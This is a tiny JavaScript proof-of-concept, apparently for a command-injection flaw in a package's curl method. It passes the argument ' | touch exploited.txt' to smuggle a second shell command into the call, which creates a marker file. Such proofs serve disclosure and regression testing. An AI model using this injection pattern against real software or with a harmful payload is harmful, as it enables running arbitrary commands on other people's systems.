'use strict'

const pkg = require('../src');

const i = new pkg();
i.env = {};
i.curl('', ' | touch exploited.txt', '');
